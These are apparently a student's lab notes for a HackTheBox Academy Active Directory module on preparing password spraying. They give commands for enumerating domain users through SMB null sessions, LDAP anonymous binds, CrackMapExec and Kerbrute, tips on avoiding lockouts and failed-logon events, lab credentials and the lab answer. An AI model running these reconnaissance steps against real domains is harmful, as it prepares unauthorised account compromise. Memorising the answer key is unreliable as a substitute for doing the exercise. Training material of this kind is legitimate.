# Password Spraying - Making a Target User List

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1455](https://academy.hackthebox.com/app/module/143/section/1455) |

---

## 🔑 Ключові команди

### SMB NULL Session — витягти список юзерів

```bash
# enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# rpcclient — NULL session
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers

# CrackMapExec — показує також badpwdcount і baddpwdtime
crackmapexec smb 172.16.5.5 --users

# CrackMapExec — з credentials
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

> 💡 `badpwdcount` — скільки разів невдало входили. Виключай акаунти близькі до lockout threshold!

---

### LDAP Anonymous Bind — витягти список юзерів

```bash
# ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# windapsearch (простіше)
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

---

### Kerbrute — username enumeration (без credentials, stealth)

```bash
# Базова команда
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Зберегти валідних юзерів у файл
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
```

> ✅ Не генерує Event ID 4625 (failed logon)  
> ⚠️ Генерує Event ID 4768 (TGT requested) — якщо Kerberos logging увімкнений  
> ⚠️ Password spraying через Kerbrute **рахується** як failed login → може lockout!

---

### Корисні wordlists для username enum

| Список | Опис |
|--------|------|
| `/opt/jsmith.txt` | 48 705 імен формату `flast` |
| `jsmith2.txt` | розширений варіант |
| `linkedin2username` | генерує список з LinkedIn сторінки компанії |

```bash
# linkedin2username
python3 linkedin2username.py -c "Inlanefreight" -n 5
```

---

## 📋 Що логувати під час password spraying

- Targeted акаунти
- Domain Controller що використовується
- Час та дата кожного spray
- Паролі що пробувались

---

## ❓ Questions

### Q1 — Кількість валідних юзерів через Kerbrute + jsmith.txt

> **Enumerate valid usernames using Kerbrute and the wordlist /opt/jsmith.txt. How many valid usernames can we enumerate?**

**Steps:**

```bash
ssh htb-student@<TARGET_IP>   # pass: HTB_@cademy_stdnt!

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
# Done! Tested 48705 usernames (56 valid) in 9.940 seconds
```

**Answer:** `56`
